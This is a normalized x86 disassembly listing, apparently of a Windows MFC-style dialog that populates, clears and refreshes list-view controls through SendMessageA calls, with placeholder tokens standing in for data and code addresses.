lea ecx [ esp + 0x8 ]
mov [ esp + 0x18 ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x10 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn 0x8
sub_40c620
push esi
mov esi ecx
push rw-data
lea ecx [ esi + 0x188 ]
call sub_4422d1
push 0x1
lea ecx [ esi + 0x98 ]
call sub_441841
push 0x0
lea ecx [ esi + 0xd4 ]
call sub_441841
push 0x0
lea ecx [ esi + 0x14c ]
call sub_441841
push 0x0
lea ecx [ esi + 0x110 ]
call sub_441841
push 0x0
mov ecx esi
call sub_440b18
pop esi
retn
sub_40c680
push ebx
push esi
push edi
mov edi ecx
push 0x1
call sub_440b18
mov eax [ edi + 0x188 ]
lea ebx [ edi + 0x188 ]
push rw-data
push eax
call sub_42d51e
add esp 0x8
test eax eax
jne r-xdata
mov eax [ edi + 0x18c ]
lea esi [ edi + 0x18c ]
push 0x0
push 0x0
push 0xffffffff
mov ecx esi
call [ eax + 0xc ]
test eax eax
jne r-xdata
push eax
push eax
push rw-data
call sub_4496b7
pop edi
pop esi
pop ebx
retn
mov edx [ esi ]
mov ecx esi
call [ edx + 0x20 ]
push ebx
lea ecx [ edi + 0x2a0 ]
call sub_442281
mov eax [ esi ]
mov ecx esi
call [ eax + 0x28 ]
mov edx [ esi ]
mov ecx esi
call [ edx + 0x10 ]
mov ecx edi
call sub_40c370
pop edi
pop esi
pop ebx
retn
push eax
push rw-data
push rw-data
mov ecx edi
call sub_43fe9c
pop edi
pop esi
pop ebx
retn
sub_40c720
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_45ddd0
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebp
push esi
push edi
mov edi ecx
push 0x1
call sub_440b18
mov eax [ edi + 0x78 ]
push 0x0
push 0x0
push 0x1042
push eax
call [ SendMessageA@IAT ]
mov esi eax
test esi esi
jge r-xdata
mov eax [ edi + 0x188 ]
lea ebp [ edi + 0x188 ]
push rw-data
push eax
call sub_42d51e
add esp 0x8
test eax eax
jne r-xdata
push 0x0
push 0x0
push rw-data
mov ecx edi
call sub_43fe9c
pop edi
pop esi
pop ebp
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
mov ecx [ rw-data ]
mov [ esp + 0xc ] ecx
push 0x0
lea edx [ esp + 0x14 ]
push esi
push edx
lea ecx [ edi + 0x5c ]
mov [ esp + 0x28 ] 0x0
call sub_43c1f0
mov eax [ eax ]
lea ecx [ esp + 0xc ]
push eax
push rw-data
push ecx
mov [ esp + 0x28 ] 0x1
call sub_43b5cc
add esp 0xc
lea ecx [ esp + 0x10 ]
mov [ esp + 0x1c ] 0x0
call sub_442148
mov eax [ esp + 0xc ]
mov edx [ edi + 0x18c ]
lea esi [ edi + 0x18c ]
push 0x0
push eax
push 0xffffffff
mov ecx esi
call [ edx + 0xc ]
test eax eax
jne r-xdata
push eax
push eax
push rw-data
call sub_4496b7
pop edi
pop esi
pop ebp
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
mov edx [ esi ]
mov ecx esi
call [ edx + 0x24 ]
push ebp
lea ecx [ edi + 0x2a0 ]
call sub_442281
mov eax [ esi ]
mov ecx esi
call [ eax + 0x28 ]
mov edx [ esi ]
mov ecx esi
call [ edx + 0x10 ]
mov ecx edi
call sub_40c370
push eax
push rw-data
push rw-data
mov ecx edi
call sub_43fe9c
jmp r-xdata
lea ecx [ esp + 0xc ]
mov [ esp + 0x1c ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x14 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
sub_40c890
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_45ddf0
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
mov esi ecx
push edi
push 0x0
mov eax [ esi + 0x78 ]
push 0x0
push 0x1042
push eax
call [ SendMessageA@IAT ]
test eax eax
jge r-xdata
mov ecx [ rw-data ]
mov [ esp + 0x8 ] ecx
push 0x0
lea edx [ esp + 0x10 ]
push eax
push edx
lea ecx [ esi + 0x5c ]
mov [ esp + 0x24 ] 0x0
call sub_43c1f0
mov eax [ eax ]
lea ecx [ esp + 0x8 ]
push eax
push rw-data
push ecx
mov [ esp + 0x24 ] 0x1
call sub_43b5cc
add esp 0xc
lea ecx [ esp + 0xc ]
mov [ esp + 0x18 ] 0x0
call sub_442148
mov eax [ esp + 0x8 ]
mov edx [ esi + 0x18c ]
lea edi [ esi + 0x18c ]
push 0x0
push eax
push 0xffffffff
mov ecx edi
call [ edx + 0xc ]
test eax eax
jne r-xdata
push 0x0
push 0x0
push rw-data
mov ecx esi
call sub_43fe9c
pop edi
pop esi
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
mov edx [ edi ]
mov ecx edi
call [ edx + 0x2c ]
mov eax [ edi ]
mov ecx edi
call [ eax + 0x10 ]
mov ecx esi
call sub_40c370
push rw-data
lea ecx [ esi + 0x188 ]
call sub_4422d1
push 0x0
mov ecx esi
call sub_440b18
push eax
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov [ esp + 0x18 ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x10 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
sub_40c9c0
push 0xffffffff
push sub_45de16
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push esi
mov esi ecx
push eax
mov [ esp + 0x8 ] esi
call sub_421517
mov edx [ rw-data ]
lea ecx [ esi + 0x114 ]
xor eax eax
mov [ esp + 0x10 ] eax
mov [ ecx ] edx
push rw-data
mov [ esp + 0x14 ] 0x1
mov [ esi ] r--data
mov [ esi + 0x110 ] eax
call sub_4422d1
mov ecx [ esp + 0x8 ]
mov [ esi + 0x14 ] 0x2
mov [ esi + 0x8c ] 0x1
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_40ca90
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
lea eax [ esi + 0x110 ]
push eax
push rw-data
push edi
mov [ edi + 0x8 ] 0x0
call sub_424ab5
push 0x0
push 0xc
add esi 0x114
push 0xff
push esi
push rw-data
push edi
call sub_4246fa
pop edi
pop esi
retn 0x4
sub_40cae0
push 0xffffffff
push sub_45de95
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push ebx
push esi
push edi
mov esi ecx
push eax
push 0x8b
mov [ esp + 0x14 ] esi
call sub_43ddd5
lea edi [ esi + 0x5c ]
mov [ esp + 0x18 ] 0x0
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0x98 ]
mov [ esp + 0x18 ] 0x1
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0xd4 ]
mov [ esp + 0x18 ] 0x2
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0x110 ]
mov [ esp + 0x18 ] 0x3
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0x14c ]
mov [ esp + 0x18 ] 0x4
mov ecx edi
call sub_43e388
mov [ edi ] r--data
mov ecx [ rw-data ]
lea edi [ esi + 0x188 ]
mov [ edi ] ecx
mov edx [ rw-data ]
lea ebx [ esi + 0x18c ]
mov [ ebx ] edx
push 0x0
lea ecx [ esi + 0x190 ]
mov [ esp + 0x1c ] 0x7
call sub_40d5c0
push rw-data
mov ecx edi
mov [ esp + 0x1c ] 0x8
mov [ esi ] r--data
call sub_4422d1
push rw-data
mov ecx ebx
call sub_4422d1
mov ecx [ esp + 0x10 ]
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_40cc10
push 0xffffffff
push sub_45deb6
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
lea ecx [ esi + 0x114 ]
mov [ esp + 0x10 ] 0x1
call sub_442148
lea ecx [ esi + 0x110 ]
mov [ esp + 0x10 ] 0x0
call sub_442148
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call sub_421723
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_40cc70
push 0xffffffff
push sub_45df3d
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
mov esi ecx
push edi
mov [ esp + 0x8 ] esi
mov [ esp + 0x18 ] 0x0
lea edi [ esi + 0x190 ]
mov [ esp + 0xc ] edi
lea ecx [ edi + 0x114 ]
mov [ esp + 0x18 ] 0x9
call sub_442148
lea ecx [ edi + 0x110 ]
mov [ esp + 0x18 ] 0x8
call sub_442148
mov ecx edi
mov [ esp + 0x18 ] 0x7
call sub_421723
lea ecx [ esi + 0x18c ]
mov [ esp + 0x18 ] 0x6
call sub_442148
lea ecx [ esi + 0x188 ]
mov [ esp + 0x18 ] 0x5
call sub_442148
lea ecx [ esi + 0x14c ]
mov [ esp + 0x18 ] 0x4
call sub_44f046
lea ecx [ esi + 0x110 ]
mov [ esp + 0x18 ] 0x3
call sub_44f046
lea ecx [ esi + 0xd4 ]
mov [ esp + 0x18 ] 0x2
call sub_44f046
lea ecx [ esi + 0x98 ]
mov [ esp + 0x18 ] 0x1
call sub_44f046
lea ecx [ esi + 0x5c ]
mov [ esp + 0x18 ] 0x0
call sub_43c0ee
mov ecx esi
mov [ esp + 0x18 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x10 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
sub_40cd70
push esi
push edi
mov esi ecx
call sub_43e113
push 0xffffffff
push 0xffffffff
lea edi [ esi + 0x5c ]
push 0x0
push rw-data
push 0x0
mov ecx edi
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x1
mov ecx edi
call sub_43c126
mov eax [ esi + 0x78 ]
mov edi [ SendMessageA@IAT ]
push 0x50
push 0x0
push 0x101e
push eax
call edi
mov ecx [ esi + 0x78 ]
push 0xa0
push 0x1
push 0x101e
push ecx
call edi
mov edx [ esi + 0x78 ]
push 0x21
push 0x0
push 0x1036
push edx
call edi
push 0x0
lea ecx [ esi + 0x98 ]
call sub_441841
push 0x0
lea ecx [ esi + 0xd4 ]
call sub_441841
push 0x0
lea ecx [ esi + 0x14c ]
call sub_441841
push 0x0
lea ecx [ esi + 0x110 ]
call sub_441841
mov ecx esi
call sub_40ce20
pop edi
mov eax 0x1
pop esi
retn
sub_40ce20
push 0xffffffff
push sub_45df58
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push ebp
mov ebp [ SendMessageA@IAT ]
push esi
mov esi ecx
xor ebx ebx
push edi
push ebx
mov eax [ esi + 0x78 ]
push ebx
push 0x1009
push eax
call ebp
mov ecx [ esi + 0x78 ]
push ebx
push ebx
push 0xb
push ecx
call ebp
push 0x1
mov ecx esi
call sub_440b18
mov edx [ rw-data ]
mov [ esp + 0x10 ] edx
lea eax [ esp + 0x10 ]
push rw-data
push eax
mov [ esp + 0x24 ] ebx
call sub_43b5cc
mov eax [ esp + 0x18 ]
mov edx [ esi + 0x190 ]
add esp 0x8
lea edi [ esi + 0x190 ]
mov ecx edi
push ebx
push eax
push 0xffffffff
call [ edx + 0xc ]
test eax eax
jne r-xdata
cmp [ esi + 0x258 ] ebx
jne r-xdata
push ebx
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
jmp r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x10 ]
mov ecx [ esi + 0x78 ]
push 0x0
push 0x1
push 0xb
push ecx
call ebp
push 0x0
lea ecx [ esi + 0x98 ]
call sub_441841
push 0x1
lea ecx [ esi + 0xd4 ]
call sub_441841
push 0x0
lea ecx [ esi + 0x14c ]
call sub_441841
push 0x0
lea ecx [ esi + 0x110 ]
call sub_441841
lea ebp [ esi + 0x5c ]
lea ecx [ esp + 0x10 ]
mov [ esp + 0x1c ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov eax [ esi + 0x2a0 ]
push 0x0
push 0x0
push 0x0
push 0x0
push eax
push ebx
push 0x1
mov ecx ebp
call sub_43c179
mov eax [ esi + 0x2a4 ]
mov ecx ebp
push eax
push 0x1
push ebx
call sub_43c1c5
mov edx [ edi ]
push 0x1
push 0x1
mov ecx edi
inc ebx
call [ edx + 0x14 ]
mov eax [ esi + 0x258 ]
test eax eax
je r-xdata
mov ebp [ SendMessageA@IAT ]
sub_40cf80
push 0xffffffff
push sub_45df80
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
mov eax [ rw-data ]
push esi
push edi
mov esi ecx
mov [ esp + 0x8 ] eax
push 0x1
mov [ esp + 0x1c ] 0x0
call sub_440b18
mov ecx [ esi + 0x78 ]
push 0x0
push 0x0
push 0x1042
push ecx
call [ SendMessageA@IAT ]
push 0x0
lea edx [ esp + 0x10 ]
push eax
push edx
lea ecx [ esi + 0x5c ]
call sub_43c1f0
mov eax [ eax ]
lea ecx [ esp + 0x8 ]
push eax
push rw-data
push ecx
mov [ esp + 0x24 ] 0x1
call sub_43b5cc
add esp 0xc
lea ecx [ esp + 0xc ]
mov [ esp + 0x18 ] 0x0
call sub_442148
mov eax [ esp + 0x8 ]
mov edx [ esi + 0x190 ]
lea edi [ esi + 0x190 ]
push 0x0
push eax
push 0xffffffff
mov ecx edi
call [ edx + 0xc ]
test eax eax
jne r-xdata
lea ecx [ esi + 0x2a4 ]
push ecx
lea ecx [ esi + 0x18c ]
call sub_442281
lea edx [ esi + 0x2a0 ]
lea ecx [ esi + 0x188 ]
push edx
call sub_442281
mov eax [ edi ]
mov ecx edi
call [ eax + 0x10 ]
push 0x0
mov ecx esi
call sub_440b18
push 0x0
lea ecx [ esi + 0x98 ]
call sub_441841
push 0x1
lea ecx [ esi + 0xd4 ]
call sub_441841
push 0x1
lea ecx [ esi + 0x14c ]
call sub_441841
push 0x1
lea ecx [ esi + 0x110 ]
call sub_441841
mov ecx [ esp + 0x24 ]
mov [ ecx ] 0x0
push eax
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov [ esp + 0x18 ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x10 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn 0x8
sub_40d0d0
push esi
mov esi ecx
push rw-data
lea ecx [ esi + 0x18c ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x188 ]
call sub_4422d1
push 0x1
lea ecx [ esi + 0x98 ]
call sub_441841
push 0x0
lea ecx [ esi + 0xd4 ]
call sub_441841
push 0x0
lea ecx [ esi + 0x14c ]
call sub_441841
push 0x0
lea ecx [ esi + 0x110 ]
call sub_441841
push 0x0
mov ecx esi
call sub_440b18
pop esi
retn
sub_40d140
push 0xffffffff
push sub_45df98
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push ebp
push esi
push edi
mov edi ecx
push 0x1
call sub_440b18
mov eax [ edi + 0x18c ]
lea ebp [ edi + 0x18c ]
push rw-data
push eax
call sub_42d51e
add esp 0x8
test eax eax
jne r-xdata
mov eax [ edi + 0x188 ]
lea ebx [ edi + 0x188 ]
push rw-data
push eax
call sub_42d51e
add esp 0x8
test eax eax
jne r-xdata
push eax
push eax
push rw-data
call sub_4496b7
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov eax [ rw-data ]
mov [ esp + 0x10 ] eax
mov ecx [ ebx ]
lea edx [ esp + 0x10 ]
push ecx
push rw-data
push edx
mov [ esp + 0x28 ] 0x0
call sub_43b5cc
mov ecx [ esp + 0x1c ]
mov eax [ edi + 0x190 ]
add esp 0xc
lea esi [ edi + 0x190 ]
push 0x0
push ecx
push 0xffffffff
mov ecx esi
call [ eax + 0xc ]
test eax eax
jne r-xdata
push eax
push eax
push rw-data
call sub_4496b7
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov eax [ edi + 0x22c ]
test eax eax
je r-xdata
push eax
push rw-data
push rw-data
mov ecx edi
call sub_43fe9c
jmp r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x20 ]
push ebp
lea ecx [ edi + 0x2a4 ]
call sub_442281
push ebx
lea ecx [ edi + 0x2a0 ]
call sub_442281
mov edx [ esi ]
mov ecx esi
call [ edx + 0x28 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x10 ]
mov ecx edi
call sub_40ce20
push 0x0
push 0x0
push rw-data
call sub_4496b7
push rw-data
mov ecx ebx
call sub_4422d1
push 0x0
mov ecx edi
call sub_440b18
mov edx [ esi ]
mov ecx esi
call [ edx + 0x10 ]
jmp r-xdata
lea ecx [ esp + 0x10 ]
mov [ esp + 0x1c ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_40d2d0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_45dfc0
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push ebp
push esi
push edi
mov esi ecx
push 0x1
call sub_440b18
mov eax [ esi + 0x78 ]
push 0x0
push 0x0
push 0x1042
push eax
call [ SendMessageA@IAT ]
mov edi eax
test edi edi
jge r-xdata
mov eax [ esi + 0x18c ]
lea ebx [ esi + 0x18c ]
push rw-data
push eax
call sub_42d51e
add esp 0x8
test eax eax
jne r-xdata
push 0x0
push 0x0
push rw-data
mov ecx esi
call sub_43fe9c
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
mov eax [ esi + 0x188 ]
lea ebp [ esi + 0x188 ]
push rw-data
push eax
call sub_42d51e
add esp 0x8
test eax eax
jne r-xdata
push eax
push eax
push rw-data
call sub_4496b7
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
mov ecx [ rw-data ]
mov [ esp + 0x10 ] ecx
push 0x0
lea edx [ esp + 0x18 ]
push edi
push edx
lea ecx [ esi + 0x5c ]
mov [ esp + 0x2c ] 0x0
call sub_43c1f0
mov eax [ eax ]
lea ecx [ esp + 0x10 ]
push eax
push rw-data
push ecx
mov [ esp + 0x2c ] 0x1
call sub_43b5cc
add esp 0xc
lea ecx [ esp + 0x14 ]
mov [ esp + 0x20 ] 0x0
call sub_442148
mov eax [ esp + 0x10 ]
mov edx [ esi + 0x190 ]
lea edi [ esi + 0x190 ]
push 0x0
push eax
push 0xffffffff
mov ecx edi
call [ edx + 0xc ]
test eax eax
jne r-xdata
push eax
push eax
push rw-data
call sub_4496b7
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
mov edx [ edi ]
mov ecx edi
call [ edx + 0x24 ]
push ebx
lea ecx [ esi + 0x2a4 ]
call sub_442281
push ebp
lea ecx [ esi + 0x2a0 ]
call sub_442281
mov eax [ edi ]
mov ecx edi
call [ eax + 0x28 ]
mov edx [ edi ]
mov ecx edi
call [ edx + 0x10 ]
mov ecx esi
call sub_40ce20
push eax
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
jmp r-xdata
lea ecx [ esp + 0x10 ]
mov [ esp + 0x20 ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x18 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
sub_40d480
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_45dfe0
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
mov esi ecx
push edi
push 0x0
mov eax [ esi + 0x78 ]
push 0x0
push 0x1042
push eax
call [ SendMessageA@IAT ]
test eax eax
jge r-xdata
mov ecx [ rw-data ]
mov [ esp + 0x8 ] ecx
push 0x0
lea edx [ esp + 0x10 ]
push eax
push edx
lea ecx [ esi + 0x5c ]
mov [ esp + 0x24 ] 0x0
call sub_43c1f0
mov eax [ eax ]
lea ecx [ esp + 0x8 ]
push eax
push rw-data
push ecx
mov [ esp + 0x24 ] 0x1
call sub_43b5cc
add esp 0xc
lea ecx [ esp + 0xc ]
mov [ esp + 0x18 ] 0x0
call sub_442148
mov eax [ esp + 0x8 ]
mov edx [ esi + 0x190 ]
lea edi [ esi + 0x190 ]
push 0x0
push eax
push 0xffffffff
mov ecx edi
call [ edx + 0xc ]
test eax eax
jne r-xdata
push 0x0
push 0x0
push rw-data
mov ecx esi
call sub_43fe9c
pop edi
pop esi
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
mov edx [ edi ]
mov ecx edi
call [ edx + 0x2c ]
mov eax [ edi ]
mov ecx edi
call [ eax + 0x10 ]
mov ecx esi
call sub_40ce20
push rw-data
lea ecx [ esi + 0x18c ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x188 ]
call sub_4422d1
push 0x0
mov ecx esi
call sub_440b18
push eax
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov [ esp + 0x18 ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x10 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
sub_40d5c0
push 0xffffffff
push sub_45e014
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push esi
push edi
mov esi ecx
push eax
mov [ esp + 0xc ] esi
call sub_421517
mov edx [ rw-data ]
lea ecx [ esi + 0x110 ]
mov [ esp + 0x14 ] 0x0
mov [ ecx ] edx
mov eax [ rw-data ]
lea edi [ esi + 0x114 ]
mov [ edi ] eax
push rw-data
mov [ esp + 0x18 ] 0x2
mov [ esi ] r--data
call sub_4422d1
push rw-data
mov ecx edi
call sub_4422d1
mov ecx [ esp + 0xc ]
mov [ esi + 0x14 ] 0x2
mov [ esi + 0x8c ] 0x1
mov eax esi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_40d6b0
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
push 0x0
push 0xc
lea eax [ esi + 0x110 ]
push 0xff
push eax
push rw-data
push edi
mov [ edi + 0x8 ] 0x0
call sub_4246fa
push 0x0
push 0xc
add esi 0x114
push 0xff
push esi
push rw-data
push edi
call sub_4246fa
pop edi
pop esi
retn 0x4
sub_40d700
push 0xffffffff
push sub_45e033
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push esi
push edi
mov esi ecx
push eax
push 0x92
mov [ esp + 0x10 ] esi
call sub_43ddd5
lea edi [ esi + 0x5c ]
mov [ esp + 0x14 ] 0x0
mov ecx edi
call sub_43e388
mov [ edi ] r--data
push 0x0
lea ecx [ esi + 0x98 ]
mov [ esp + 0x18 ] 0x1
call sub_40ed20
mov ecx [ esp + 0xc ]
mov [ esi ] r--data
mov eax esi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_40d7a0
push 0xffffffff
push sub_45e0a1
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
push edi
mov edi ecx
mov [ esp + 0x8 ] edi
mov [ esp + 0x18 ] 0x0
lea esi [ edi + 0x98 ]
mov [ esp + 0xc ] esi
lea ecx [ esi + 0x128 ]
mov [ esp + 0x18 ] 0x7
call sub_442148
lea ecx [ esi + 0x124 ]
mov [ esp + 0x18 ] 0x6
call sub_442148
lea ecx [ esi + 0x120 ]
mov [ esp + 0x18 ] 0x5
call sub_442148
lea ecx [ esi + 0x11c ]
mov [ esp + 0x18 ] 0x4
call sub_442148
lea ecx [ esi + 0x118 ]
mov [ esp + 0x18 ] 0x3
call sub_442148
lea ecx [ esi + 0x114 ]
mov [ esp + 0x18 ] 0x2
call sub_442148
mov ecx esi
mov [ esp + 0x18 ] 0x1
call sub_421723
lea ecx [ edi + 0x5c ]
mov [ esp + 0x18 ] 0x0
call sub_43c0ee
mov ecx edi
mov [ esp + 0x18 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x10 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
sub_40d880
push ecx
push esi
push edi
mov esi ecx
call sub_43e113
push 0xffffffff
push 0xffffffff
lea edi [ esi + 0x5c ]
push 0x0
push rw-data
push 0x0
mov ecx edi
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x1
mov ecx edi
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x2
mov ecx edi
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x3
mov ecx edi
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x4
mov ecx edi
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x5
mov ecx edi
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x6
mov ecx edi
call sub_43c126
mov eax [ esi + 0x78 ]
mov edi [ SendMessageA@IAT ]
push 0x3c
push 0x0
push 0x101e
push eax
call edi
mov ecx [ esi + 0x78 ]
push 0x50
push 0x1
push 0x101e
push ecx
call edi
mov edx [ esi + 0x78 ]
push 0x50
push 0x2
push 0x101e
push edx
call edi
mov eax [ esi + 0x78 ]
push 0x50
push 0x3
push 0x101e
push eax
call edi
push 0x64
push 0x4
mov ecx [ esi + 0x78 ]
push 0x101e
push ecx
call edi
mov edx [ esi + 0x78 ]
push 0xa0
push 0x5
push 0x101e
push edx
call edi
mov eax [ esi + 0x78 ]
push 0xa0
push 0x6
push 0x101e
push eax
call edi
mov ecx [ esi + 0x78 ]
push 0x21
push 0x0
push 0x1036
push ecx
call edi
push ecx
mov ecx esp
mov [ esp + 0xc ] esp
push rw-data
call sub_4421b6
mov ecx esi
call sub_40d9c0
pop edi
mov eax 0x1
pop esi
pop ecx
retn
sub_40d9c0
push 0xffffffff
push sub_45e0b8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x14
push ebx
push ebp
push esi
push edi
mov esi ecx
mov eax [ esi + 0x78 ]
mov ebx [ SendMessageA@IAT ]
xor edi edi
push edi
push edi
push 0x1009
push eax
mov [ esp + 0x3c ] edi
call ebx
mov ecx [ esi + 0x78 ]
push edi
push edi
push 0xb
push ecx
call ebx
push 0x1
mov ecx esi
call sub_440b18
mov eax [ esp + 0x34 ]
mov edx [ esi + 0x98 ]
lea ebp [ esi + 0x98 ]
push edi
push eax
push 0xffffffff
mov ecx ebp
call [ edx + 0xc ]
test eax eax
jne r-xdata
cmp [ esi + 0x160 ] edi
jne r-xdata
push edi
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
jmp r-xdata
mov eax [ ebp ]
mov ecx ebp
call [ eax + 0x10 ]
mov ecx [ esi + 0x78 ]
push 0x0
push 0x1
push 0xb
push ecx
call ebx
lea ebx [ esi + 0x5c ]
lea ecx [ esp + 0x34 ]
mov [ esp + 0x2c ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x24 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x20
retn 0x4
mov edx [ esi + 0x1a8 ]
lea ecx [ esp + 0x10 ]
push 0xa
push ecx
push edx
call sub_42d656
add esp 0xc
lea eax [ esp + 0x10 ]
mov ecx ebx
push 0x0
push 0x0
push 0x0
push 0x0
push eax
push edi
push 0x1
call sub_43c179
mov eax [ esi + 0x1b0 ]
mov ecx ebx
push eax
push 0x1
push edi
call sub_43c1c5
mov eax [ esi + 0x1ac ]
mov ecx ebx
push eax
push 0x2
push edi
call sub_43c1c5
mov eax [ esi + 0x1b4 ]
mov ecx ebx
push eax
push 0x3
push edi
call sub_43c1c5
mov eax [ esi + 0x1b8 ]
mov ecx ebx
push eax
push 0x4
push edi
call sub_43c1c5
mov eax [ esi + 0x1c0 ]
mov ecx ebx
push eax
push 0x5
push edi
call sub_43c1c5
mov eax [ esi + 0x1bc ]
mov ecx ebx
push eax
push 0x6
push edi
call sub_43c1c5
mov edx [ ebp ]
push 0x1
push 0x1
mov ecx ebp
inc edi
call [ edx + 0x14 ]
mov eax [ esi + 0x160 ]
test eax eax
je r-xdata
mov ebx [ SendMessageA@IAT ]
sub_40db40
push 0xffffffff
push sub_45e151
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xb4
push esi
push edi
mov edi ecx
push 0x0
lea ecx [ esp + 0x10 ]
call sub_40e960
lea ecx [ esp + 0xc ]
mov [ esp + 0xc4 ] 0x0
call sub_43de8a
cmp eax 0x1
jne r-xdata
lea ecx [ esp + 0xb8 ]
mov [ esp + 0xc4 ] 0xe
call sub_442148
lea ecx [ esp + 0xb4 ]
mov [ esp + 0xc4 ] 0xd
call sub_442148
lea ecx [ esp + 0xb0 ]
